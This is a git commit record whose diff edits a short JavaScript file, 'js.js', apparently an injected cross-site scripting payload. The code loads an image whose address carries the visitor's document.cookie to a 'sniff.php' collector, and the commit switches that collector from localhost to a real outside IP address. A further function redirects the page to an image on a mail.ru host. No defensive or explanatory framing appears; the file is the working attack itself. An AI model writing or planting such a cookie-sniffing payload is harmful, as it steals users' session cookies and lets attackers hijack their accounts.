1c7dc9fe59e139d49dd18636052dfe730566a469
vov4ick77 <94533928+vov4ick77@users.noreply.github.com>
2023-08-30 22:18:41 +0300

    js.js

--- js.js
+++ js.js
@@ -1,5 +1,5 @@
 img=new Image();
-img.src='http://localhost/sniff.php?cookie='+document.cookie;
+img.src='http://92.63.176.97/sniff.php?cookie='+document.cookie;
 function F() {
 location='https://otvet.imgsmail.ru/download/234054366_4f953678a2475e9c53a807f249174753_800.jpg';
 }
